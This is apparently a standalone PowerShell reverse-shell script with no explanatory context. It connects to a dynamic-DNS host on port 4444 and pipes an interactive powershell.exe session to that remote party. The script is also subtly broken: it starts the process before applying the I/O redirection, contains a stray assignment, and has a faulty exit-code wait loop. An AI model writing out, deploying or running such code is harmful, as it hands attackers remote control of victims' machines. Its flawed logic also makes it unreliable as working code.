$ip = "suber122.duckdns.org"
$port = "4444"
$socket = New-Object Net.Sockets.TcpClient($ip,$port)
$stream = $socket.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$shell = "powershell.exe"
$proc = [System.Diagnostics.Process]::Start($shell)
$cmds = $proc.StartInfo.RedirectStandardError = $true
$proc.StartInfo.RedirectStandardInput = $true
$proc.StartInfo.RedirectStandardOutput = $true
$proc.StartInfo.UseShellExecute = $false
$proc.Start()
while($proc.ExitCode -eq $null){
  Start-Sleep 1
}
while(!$socket.Connected){
  Start-Sleep 1
}
while($socket.Connected){
  try{
    $output = $proc.StandardOutput.ReadLine() 
    $err = $proc.StandardError.ReadLine() 
    $writer.WriteLine($output) 
    $writer.WriteLine($err) 
    $writer.Flush()
    $input = $reader.ReadLine() 
    $proc.StandardInput.WriteLine($input) 
    $proc.StandardInput.Flush() 
  }catch{
    break
  }
}
$socket.Close()
$proc.Close()
